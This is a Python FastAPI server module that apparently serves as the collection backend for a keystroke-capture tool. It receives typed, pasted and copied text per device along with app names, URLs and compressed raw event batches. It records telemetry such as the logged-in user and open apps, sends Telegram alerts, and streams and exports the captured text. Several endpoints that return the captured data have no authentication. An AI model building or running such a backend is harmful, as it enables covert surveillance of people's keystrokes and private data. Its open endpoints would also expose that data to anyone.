import asyncio
import base64
import csv
import gzip
import hashlib
import hmac
import html
import io
import json
import os
import re
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from threading import Lock
from typing import Deque, Dict
from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from starlette.datastructures import UploadFile
import psycopg
from PIL import Image, UnidentifiedImageError
from .state import state

@state.app.post('/api/messages')
async def add_message(payload: state.MessageInput, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    if payload.raw_only:
        return JSONResponse({'ok': True, 'ignored': True})
    text = payload.text.strip()
    if not text:
        return JSONResponse({'ok': False, 'error': 'empty message'})
    now = int(time.time() * 1000)
    device_id = payload.device_id.strip() or 'unknown'
    device_name = payload.device_name.strip() or 'Unknown device'
    app_name = payload.app_name.strip() or 'Unknown app'
    source_url = payload.source_url.strip()
    is_pasted = payload.is_pasted
    is_copied = payload.is_copied
    raw_text = payload.raw_text.strip() or text
    previous_device = state.devices.get(device_id, {})
    state.devices[device_id] = {'id': device_id, 'name': device_name, 'last_seen': now, 'started_at': previous_device.get('started_at', now), 'joined_at': previous_device.get('joined_at', now)}
    state.device_online_states[device_id] = True
    item = {'id': now, 'text': text, 'raw_text': raw_text, 'raw_only': False, 'time': now, 'device_id': device_id, 'device_name': device_name, 'app_name': app_name, 'source_url': source_url, 'is_pasted': is_pasted, 'is_copied': is_copied}
    try:
        inserted = state.save_message(item)
    except Exception as error:
        print(f'Could not save message: {error}')
        return JSONResponse({'ok': False, 'error': 'message storage unavailable'}, status_code=503)
    if not inserted:
        return JSONResponse({'ok': True, 'duplicate': True})
    if payload.retry:
        await asyncio.to_thread(state.send_telegram_message, state.telegram_panel('SYNC // OFFLINE UPLOAD', f'📨 Message received from offline queue.\nDEVICE: <b>{html.escape(device_name)}</b>\nID: <code>{html.escape(device_id)}</code>'))
    state.messages.append(item)
    return JSONResponse({'ok': True, 'message': item})
state.register('add_message', add_message)

@state.app.post('/api/raw-batches')
async def add_raw_batch(payload: state.RawBatchInput, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    if not state.DATABASE_URL:
        return JSONResponse({'ok': False, 'error': 'raw storage unavailable'}, status_code=503)
    if not payload.batch_id.strip() or not payload.device_id.strip() or payload.event_count < 1:
        return JSONResponse({'ok': False, 'error': 'invalid raw batch'}, status_code=400)
    try:
        decoded = gzip.decompress(base64.b64decode(payload.payload_base64))
        state.events = json.loads(decoded.decode('utf-8'))
        if not isinstance(state.events, list) or len(state.events) != payload.event_count:
            return JSONResponse({'ok': False, 'error': 'invalid raw payload'}, status_code=400)
    except (ValueError, OSError, json.JSONDecodeError):
        return JSONResponse({'ok': False, 'error': 'invalid raw payload'}, status_code=400)
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute('\n                    INSERT INTO raw_batches\n                    (batch_id, device_id, device_name, session_id, started_at, ended_at, event_count, payload_base64)\n                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\n                    ON CONFLICT (batch_id) DO NOTHING\n                    ', (payload.batch_id.strip(), payload.device_id.strip(), payload.device_name.strip() or 'Unknown device', payload.session_id.strip(), payload.started_at, payload.ended_at, payload.event_count, payload.payload_base64))
    except Exception as error:
        print(f'Could not save raw batch: {error}')
        return JSONResponse({'ok': False, 'error': 'raw storage unavailable'}, status_code=503)
    return JSONResponse({'ok': True})
state.register('add_raw_batch', add_raw_batch)

@state.app.get('/events')
async def events(request: Request, device_id: str | None=None, since: int=0):
    selected_device_id = (device_id or '').strip()

    async def event_generator():
        last_seen = max(0, since)
        last_keepalive = time.monotonic()
        while True:
            sent_event = False
            for msg in list(state.messages):
                msg_id = int(msg['id'])
                if msg_id > last_seen:
                    if not selected_device_id or str(msg.get('device_id')) == selected_device_id:
                        yield f'data: {json.dumps(msg)}\n\n'
                        sent_event = True
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            if time.monotonic() - last_keepalive >= 15:
                yield ': keepalive\n\n'
                last_keepalive = time.monotonic()
            if not sent_event:
                await asyncio.sleep(0.75)
    return StreamingResponse(event_generator(), media_type='text/event-stream', headers={'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'X-Accel-Buffering': 'no'})
state.register('events', events)

@state.app.get('/api/export/messages')
async def export_messages(device_id: str | None=None, format: str='csv'):
    selected = (device_id or '').strip()
    items = [item for item in state.messages if not selected or str(item.get('device_id')) == selected]
    state.audit_event('messages_exported', device_id=selected, details={'format': format, 'count': len(items)})
    if format.lower() == 'json':
        return JSONResponse(items)
    output = io.StringIO()
    writer = csv.DictWriter(output, fieldnames=['id', 'time', 'device_id', 'device_name', 'app_name', 'text', 'source_url'])
    writer.writeheader()
    for item in items:
        writer.writerow({field: item.get(field, '') for field in writer.fieldnames})
    return Response(output.getvalue(), media_type='text/csv', headers={'Content-Disposition': 'attachment; filename=keyboardservice-messages.csv'})
state.register('export_messages', export_messages)

@state.app.get('/api/devices/documents/{attachment_id}')
async def fetch_message_document(attachment_id: str, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    match = re.fullmatch('[0-9a-f]{32}\\.(pdf|docx|rtf|txt)', attachment_id)
    if not match:
        return JSONResponse({'ok': False, 'error': 'document not found'}, status_code=404)
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'document storage unavailable'}, status_code=503)
    extension = match.group(1)
    try:
        document_bytes = await asyncio.to_thread(state.read_storage_image, f'documents/{attachment_id}')
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError) as error:
        print(f'Could not load message document: {error}')
        return JSONResponse({'ok': False, 'error': 'document unavailable'}, status_code=503)
    return Response(document_bytes, media_type=state.MESSAGE_DOCUMENT_MIME_TYPES[extension], headers={'Cache-Control': 'no-store', 'Content-Disposition': f'attachment; filename="{attachment_id}"', 'X-Content-Type-Options': 'nosniff'})
state.register('fetch_message_document', fetch_message_document)

@state.app.get('/api/devices/media/{media_id}')
async def fetch_message_image(media_id: str, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    match = re.fullmatch('[0-9a-f]{32}\\.(jpg|png|gif|webp)', media_id)
    if not match:
        return JSONResponse({'ok': False, 'error': 'image not found'}, status_code=404)
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'image storage unavailable'}, status_code=503)
    media_types = {'jpg': 'image/jpeg', 'png': 'image/png', 'gif': 'image/gif', 'webp': 'image/webp'}
    try:
        image_bytes = await asyncio.to_thread(state.read_storage_image, f'messages/{media_id}')
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError) as error:
        print(f'Could not load message image: {error}')
        return JSONResponse({'ok': False, 'error': 'image unavailable'}, status_code=503)
    return Response(image_bytes, media_type=media_types[match.group(1)], headers={'Cache-Control': 'no-store'})
state.register('fetch_message_image', fetch_message_image)

@state.app.get('/messages')
async def fetch_messages(device_id: str | None=None):
    selected_device_id = (device_id or '').strip()
    result = [item for item in state.messages if not selected_device_id or str(item.get('device_id')) == selected_device_id]
    return JSONResponse(result)
state.register('fetch_messages', fetch_messages)

def format_uptime(seconds):
    days, remainder = divmod(max(0, int(seconds)), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    parts = []
    if days:
        parts.append(f'{days}d')
    if hours or days:
        parts.append(f'{hours}h')
    if minutes or hours or days:
        parts.append(f'{minutes}m')
    parts.append(f'{seconds}s')
    return ' '.join(parts)
state.register('format_uptime', format_uptime)

def load_devices():
    if not state.DATABASE_URL:
        return
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute('\n                    SELECT device_id, device_name, client_version, client_ip, local_ip, last_seen, started_at, joined_at\n                    FROM devices\n                    ORDER BY last_seen DESC\n                    ')
                rows = cursor.fetchall()
        for device_id, device_name, client_version, client_ip, local_ip, last_seen, started_at, joined_at in rows:
            state.devices[str(device_id)] = {'id': device_id, 'name': device_name, 'client_version': client_version or '', 'client_ip': client_ip or '', 'local_ip': local_ip or '', 'last_seen': last_seen, 'started_at': started_at, 'joined_at': joined_at}
            state.device_online_states[str(device_id)] = int(time.time() * 1000) - int(last_seen) <= state.DEVICE_OFFLINE_AFTER * 1000
    except Exception as error:
        print(f'Could not load Supabase devices: {error}')
state.register('load_devices', load_devices)

def load_file_messages():
    try:
        with state.LOG_PATH.open('r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []
    parsed = []
    for line in lines:
        if '|' not in line:
            continue
        parts = line.split('|', 5)
        try:
            if len(parts) == 2:
                ts, text = parts
                device_id = 'unknown'
                device_name = 'Unknown device'
                is_pasted = False
                is_copied = False
            elif len(parts) == 5:
                ts, device_id, device_name, pasted_value, text = parts
                is_pasted = pasted_value == '1'
                is_copied = False
            elif len(parts) == 6:
                ts, device_id, device_name, pasted_value, copied_value, text = parts
                is_pasted = pasted_value == '1'
                is_copied = copied_value == '1'
            else:
                ts, device_id, device_name, text = parts
                is_pasted = False
                is_copied = False
            parsed.append({'id': int(ts), 'text': text.strip(), 'raw_text': text.strip(), 'raw_only': False, 'time': int(ts), 'device_id': device_id, 'device_name': device_name, 'app_name': 'Unknown app', 'is_pasted': is_pasted, 'is_copied': is_copied})
        except ValueError:
            continue
    return parsed
state.register('load_file_messages', load_file_messages)

def load_text_messages():
    parsed = []
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute('\n                        SELECT id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied\n                        FROM messages\n                        ORDER BY time DESC\n                        LIMIT %s\n                        ', (state.MAX_MESSAGES,))
                    rows = cursor.fetchall()
            parsed = [{'id': row[0], 'text': row[1], 'raw_text': row[2] or row[1], 'raw_only': row[3], 'device_id': row[4], 'device_name': row[5], 'app_name': row[6], 'source_url': row[7] or '', 'time': row[8], 'is_pasted': row[9], 'is_copied': row[10]} for row in reversed(rows)]
        except Exception as error:
            print(f'Could not load Supabase messages: {error}')
    if not parsed:
        parsed = state.load_file_messages()
    state.messages = deque(parsed[-state.MAX_MESSAGES:], maxlen=state.MAX_MESSAGES)
    for item in state.messages:
        state.devices[str(item['device_id'])] = {'id': item['device_id'], 'name': item['device_name'], 'last_seen': item['time'], 'started_at': item['time'], 'joined_at': item['time']}
state.register('load_text_messages', load_text_messages)

@state.app.get('/api/raw-history')
async def raw_history(device_id: str | None=None, session_id: str | None=None, start_time: int | None=None, end_time: int | None=None, limit: int=100):
    if not state.DATABASE_URL:
        return JSONResponse([])
    limit = min(max(limit, 1), 500)
    clauses = []
    values = []
    if device_id and device_id.strip():
        clauses.append('device_id = %s')
        values.append(device_id.strip())
    if session_id and session_id.strip():
        clauses.append('session_id = %s')
        values.append(session_id.strip())
    if start_time is not None:
        clauses.append('ended_at >= %s')
        values.append(start_time)
    if end_time is not None:
        clauses.append('started_at <= %s')
        values.append(end_time)
    where = f"WHERE {' AND '.join(clauses)}" if clauses else ''
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(f'\n                    SELECT batch_id, device_id, device_name, session_id, started_at, ended_at,\n                           event_count, payload_base64\n                    FROM raw_batches {where}\n                    ORDER BY started_at DESC LIMIT %s\n                    ', (*values, limit))
                rows = cursor.fetchall()
    except Exception as error:
        print(f'Could not load raw history: {error}')
        return JSONResponse({'ok': False, 'error': 'raw storage unavailable'}, status_code=503)
    result = []
    for row in rows:
        try:
            state.events = json.loads(gzip.decompress(base64.b64decode(row[7])).decode('utf-8'))
        except (ValueError, OSError, json.JSONDecodeError):
            continue
        result.append({'batch_id': row[0], 'device_id': row[1], 'device_name': row[2], 'session_id': row[3], 'started_at': row[4], 'ended_at': row[5], 'event_count': row[6], 'events': state.events})
    return JSONResponse(result)
state.register('raw_history', raw_history)

def resolve_client_ip(request: Request) -> str:
    forwarded_for = request.headers.get('x-forwarded-for')
    if forwarded_for:
        ip = forwarded_for.split(',', 1)[0].strip()
        if ip:
            return ip
    real_ip = request.headers.get('x-real-ip')
    if real_ip:
        return real_ip.strip()
    cf_ip = request.headers.get('cf-connecting-ip')
    if cf_ip:
        return cf_ip.strip()
    client = request.client
    return (client.host if client else 'unknown').strip() or 'unknown'
state.register('resolve_client_ip', resolve_client_ip)

def save_device(device_id, device_name, last_seen, started_at, joined_at, telemetry=None):
    telemetry = telemetry or {}
    previous = state.devices.get(device_id, {})
    local_time_ms = telemetry.get('local_time_ms')
    if not isinstance(local_time_ms, (int, float)) or local_time_ms < 100000000000:
        local_time_ms = previous.get('local_time_ms')
    client_version = telemetry.get('client_version') or previous.get('client_version') or ''
    client_ip = (telemetry.get('client_ip') or previous.get('client_ip') or '').strip()
    local_ip = (telemetry.get('local_ip') or previous.get('local_ip') or '').strip()
    state.devices[device_id] = {'id': device_id, 'name': device_name, 'client_version': client_version, 'client_ip': client_ip, 'local_ip': local_ip, 'last_seen': last_seen, 'started_at': started_at, 'joined_at': joined_at, 'local_time': telemetry.get('local_time') or previous.get('local_time', ''), 'local_time_ms': local_time_ms, 'logged_in_user': telemetry.get('logged_in_user') or previous.get('logged_in_user', ''), 'battery_percent': telemetry.get('battery_percent') if telemetry.get('battery_percent') is not None else previous.get('battery_percent'), 'battery_status': telemetry.get('battery_status') or previous.get('battery_status', 'Unknown'), 'open_apps': telemetry.get('open_apps', previous.get('open_apps', []))[:30]}
    if not state.DATABASE_URL:
        return
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('\n                INSERT INTO devices (device_id, device_name, client_version, client_ip, local_ip, last_seen, started_at, joined_at)\n                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\n                ON CONFLICT (device_id) DO UPDATE SET\n                    device_name = EXCLUDED.device_name,\n                    client_version = EXCLUDED.client_version,\n                    client_ip = EXCLUDED.client_ip,\n                    local_ip = EXCLUDED.local_ip,\n                    last_seen = EXCLUDED.last_seen,\n                    started_at = EXCLUDED.started_at,\n                    joined_at = EXCLUDED.joined_at\n                ', (device_id, device_name, client_version, client_ip, local_ip, last_seen, started_at, joined_at))
state.register('save_device', save_device)

def save_message(item):
    if any((existing.get('id') == item['id'] for existing in state.messages)):
        return False
    if not state.DATABASE_URL:
        state.write_text_log()
        return True
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('\n                INSERT INTO messages (id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied)\n                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)\n                ON CONFLICT (id) DO NOTHING\n                ', (item['id'], item['text'], item['raw_text'], item['raw_only'], item['device_id'], item['device_name'], item['app_name'], item['source_url'], item['time'], item['is_pasted'], item['is_copied']))
            return cursor.rowcount > 0
state.register('save_message', save_message)

def save_message_document(attachment_id, document_bytes, extension):
    storage_path = f'documents/{attachment_id}'
    encoded_storage_path = urllib.parse.quote(storage_path, safe='/')
    storage_request = urllib.request.Request(f'{state.SUPABASE_URL}/storage/v1/object/{state.SCREENSHOT_BUCKET}/{encoded_storage_path}', data=document_bytes, headers={'Authorization': f'Bearer {state.SUPABASE_SERVICE_ROLE_KEY}', 'apikey': state.SUPABASE_SERVICE_ROLE_KEY, 'Content-Type': state.MESSAGE_DOCUMENT_MIME_TYPES[extension], 'x-upsert': 'false'}, method='POST')
    try:
        with urllib.request.urlopen(storage_request, timeout=30) as response:
            if response.status >= 400:
                raise RuntimeError(f'Storage HTTP {response.status}')
    except HTTPError as error:
        detail = error.read().decode('utf-8', errors='replace')[:240]
        raise RuntimeError(f'Storage HTTP {error.code}: {detail}') from error
state.register('save_message_document', save_message_document)

def save_message_image(media_id, image_bytes, image_format):
    storage_path = f'messages/{media_id}'
    encoded_storage_path = urllib.parse.quote(storage_path, safe='/')
    storage_request = urllib.request.Request(f'{state.SUPABASE_URL}/storage/v1/object/{state.SCREENSHOT_BUCKET}/{encoded_storage_path}', data=image_bytes, headers={'Authorization': f'Bearer {state.SUPABASE_SERVICE_ROLE_KEY}', 'apikey': state.SUPABASE_SERVICE_ROLE_KEY, 'Content-Type': Image.MIME.get(image_format, 'application/octet-stream'), 'x-upsert': 'false'}, method='POST')
    try:
        with urllib.request.urlopen(storage_request, timeout=30) as response:
            if response.status >= 400:
                raise RuntimeError(f'Storage HTTP {response.status}')
    except HTTPError as error:
        detail = error.read().decode('utf-8', errors='replace')[:240]
        raise RuntimeError(f'Storage HTTP {error.code}: {detail}') from error
state.register('save_message_image', save_message_image)

@state.app.post('/api/devices/document-upload')
async def upload_message_document(request: Request):
    form = await request.form()
    uploaded_file = form.get('file')
    if not isinstance(uploaded_file, UploadFile):
        return JSONResponse({'ok': False, 'error': 'document file required'}, status_code=400)
    document_bytes = await uploaded_file.read(state.MAX_MESSAGE_DOCUMENT_BYTES + 1)
    try:
        extension = state.validate_message_document(uploaded_file.filename, document_bytes)
    except ValueError as error:
        return JSONResponse({'ok': False, 'error': str(error)}, status_code=400)
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'document storage unavailable'}, status_code=503)
    attachment_id = f'{uuid.uuid4().hex}.{extension}'
    try:
        await asyncio.to_thread(state.save_message_document, attachment_id, document_bytes, extension)
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError) as error:
        print(f'Could not save message document: {error}')
        return JSONResponse({'ok': False, 'error': 'document storage unavailable'}, status_code=503)
    return JSONResponse({'ok': True, 'attachment_id': attachment_id})
state.register('upload_message_document', upload_message_document)

@state.app.post('/api/devices/media-upload')
async def upload_message_image(request: Request):
    form = await request.form()
    uploaded_file = form.get('file')
    if not isinstance(uploaded_file, UploadFile):
        return JSONResponse({'ok': False, 'error': 'image file required'}, status_code=400)
    image_bytes = await uploaded_file.read(state.MAX_MESSAGE_IMAGE_BYTES + 1)
    if not image_bytes or len(image_bytes) > state.MAX_MESSAGE_IMAGE_BYTES:
        return JSONResponse({'ok': False, 'error': 'image must be 10 MB or smaller'}, status_code=400)
    try:
        with Image.open(io.BytesIO(image_bytes)) as image:
            image.verify()
            image_format = image.format
    except (UnidentifiedImageError, OSError, ValueError):
        return JSONResponse({'ok': False, 'error': 'unsupported or invalid image'}, status_code=400)
    extension = state.MESSAGE_IMAGE_EXTENSIONS.get(image_format)
    if not extension:
        return JSONResponse({'ok': False, 'error': 'use a JPEG, PNG, GIF, or WebP image'}, status_code=400)
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'image storage unavailable'}, status_code=503)
    media_id = f'{uuid.uuid4().hex}.{extension}'
    try:
        await asyncio.to_thread(state.save_message_image, media_id, image_bytes, image_format)
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError) as error:
        print(f'Could not save message image: {error}')
        return JSONResponse({'ok': False, 'error': 'image storage unavailable'}, status_code=503)
    return JSONResponse({'ok': True, 'attachment_id': media_id})
state.register('upload_message_image', upload_message_image)

def validate_message_document(filename, document_bytes):
    extension = Path(str(filename or '')).suffix.lower().lstrip('.')
    if extension not in state.MESSAGE_DOCUMENT_MIME_TYPES:
        raise ValueError('Use a PDF, DOCX, RTF, or TXT document.')
    if not document_bytes or len(document_bytes) > state.MAX_MESSAGE_DOCUMENT_BYTES:
        raise ValueError('Document must be non-empty and 20 MB or smaller.')
    if extension == 'pdf' and (not document_bytes.startswith(b'%PDF-')):
        raise ValueError('The file does not appear to be a valid PDF.')
    if extension == 'rtf' and (not document_bytes.lstrip().startswith(b'{\\rtf')):
        raise ValueError('The file does not appear to be a valid RTF document.')
    if extension == 'txt':
        try:
            decoded_text = document_bytes.decode('utf-8-sig')
        except UnicodeDecodeError as error:
            raise ValueError('Text documents must use UTF-8 encoding.') from error
        if '\x00' in decoded_text:
            raise ValueError('The file does not appear to be a text document.')
    if extension == 'docx':
        try:
            with zipfile.ZipFile(io.BytesIO(document_bytes)) as archive:
                entries = archive.infolist()
                names = {entry.filename.lower() for entry in entries}
        except (OSError, zipfile.BadZipFile) as error:
            raise ValueError('The file does not appear to be a valid DOCX document.') from error
        if 'word/document.xml' not in names or '[content_types].xml' not in names or 'word/vbaproject.bin' in names or (sum((entry.file_size for entry in entries)) > 100 * 1024 * 1024):
            raise ValueError('The file does not appear to be a supported DOCX document.')
    return extension
state.register('validate_message_document', validate_message_document)

def write_text_log():
    line_text = '\n'.join((f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{(1 if item.get('is_pasted') else 0)}|{(1 if item.get('is_copied') else 0)}|{item['text']}" for item in list(state.messages)))
    with state.LOG_PATH.open('w', encoding='utf-8') as f:
        f.write(line_text)
state.register('write_text_log', write_text_log)
